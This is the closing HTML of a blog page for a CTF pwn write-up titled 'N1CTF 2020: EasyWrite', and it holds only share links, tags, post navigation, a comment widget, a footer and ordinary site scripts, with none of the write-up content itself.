EasyWrite"><i data-svg-src=https://cdn.jsdelivr.net/npm/simple-icons@7.3.0/icons/line.svg aria-hidden=true></i></a><a href=javascript:void(0); title="Share on 微博" data-sharer=weibo data-url=https://152334H.github.io/blog/n1ctf-2020-easywrite/ data-title="N1CTF 2020: EasyWrite"><i class="fab fa-weibo fa-fw" aria-hidden=true></i></a></span></div></div></div><div class=post-info-more><section class=post-tags><i class="fas fa-tags fa-fw" aria-hidden=true></i>&nbsp;<a href=/tags/pwn/>pwn</a>,&nbsp;<a href=/tags/writeup/>writeup</a></section><section><span><a href=javascript:void(0); onclick=window.history.back()>Back</a></span>&nbsp;|&nbsp;<span><a href=/>Home</a></span></section></div><div class=post-nav><a href=/blog/rarctf-2021-the-mound/ class=prev rel=prev title="Getting things wrong: How I spent 24-hours on a beginner's CTF pwn"><i class="fas fa-angle-left fa-fw" aria-hidden=true></i>Getting things wrong: How I spent 24-hours on a beginner's CTF pwn</a>
+<a href=/blog/hosting-pwn-challenges/ class=next rel=next title="Hosting pwn challenges: a simple tutorial">Hosting pwn challenges: a simple tutorial<i class="fas fa-angle-right fa-fw" aria-hidden=true></i></a></div></div><div id=comments><div id=giscus class=comment></div><noscript>Please enable JavaScript to view the comments powered by <a href=https://giscus.app>Giscus</a>.</noscript></div></article></div></main><footer class=footer><div class=footer-container><div class=footer-line itemscope itemtype=http://schema.org/CreativeWork><i class="far fa-copyright fa-fw" aria-hidden=true></i><span itemprop=copyrightYear>2022</span><span class=author itemprop=copyrightHolder>&nbsp;<a href=https://152334H.github.io/ target=_blank>152334H</a></span></div></div></footer></div><div id=fixed-buttons><a href=# id=back-to-top class=fixed-button title="Back to Top"><i class="fas fa-arrow-up fa-fw" aria-hidden=true></i>
+</a><a href=# id=view-comments class=fixed-button title="View Comments"><i class="fas fa-comment fa-fw" aria-hidden=true></i></a></div><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/katex@0.16.0/dist/katex.min.css><script type=text/javascript src=https://cdn.jsdelivr.net/npm/autocomplete.js@0.38.1/dist/autocomplete.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/lunr@2.3.9/lunr.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/twemoji@14.0.2/dist/twemoji.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/sharer.js@0.5.1/sharer.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/katex@0.16.0/dist/katex.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/katex@0.16.0/dist/contrib/auto-render.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/katex@0.16.0/dist/contrib/copy-tex.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/katex@0.16.0/dist/contrib/mhchem.min.js></script><script type=text/javascript>window.config={code:{copyTitle:"Copy to clipboard",maxShownLines:10},comment:{giscus:{category:"Announcements",categoryId:"DIC_kwDOH03r284CQ2Tu",darkTheme:"dark_dimmed",emitMetadata:"0",inputPosition:"bottom",lang:"en",lazyLoading:!1,lightTheme:"light",mapping:"pathname",reactionsEnabled:"1",repo:"152334H/blog",repoId:"R_kgDOH03r2w"}},math:{delimiters:[{display:!0,left:"$$",right:"$$"},{display:!0,left:"\\[",right:"\\]"},{display:!0,left:"\\begin{equation}",right:"\\end{equation}"},{display:!0,left:"\\begin{equation*}",right:"\\end{equation*}"},{display:!0,left:"\\begin{align}",right:"\\end{align}"},{display:!0,left:"\\begin{align*}",right:"\\end{align*}"},{display:!0,left:"\\begin{alignat}",right:"\\end{alignat}"},{display:!0,left:"\\begin{alignat*}",right:"\\end{alignat*}"},{display:!0,left:"\\begin{gather}",right:"\\end{gather}"},{display:!0,left:"\\begin{CD}",right:"\\end{CD}"},{display:!1,left:"$",right:"$"},{display:!1,left:"\\(",right:"\\)"}],strict:!1},search:{highlightTag:"em",lunrIndexURL:"/index.json",maxResultLength:10,noResultsFound:"No results found",snippetLength:30,type:"lunr"},twemoji:!0}</script><script type=text/javascript src=/js/theme.min.js></script><script type=text/javascript>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-W0STJ4D3N3",{anonymize_ip:!0})</script><script type=text/javascript src="https://www.googletagmanager.com/gtag/js?id=G-W0STJ4D3N3" async></script></body></html>
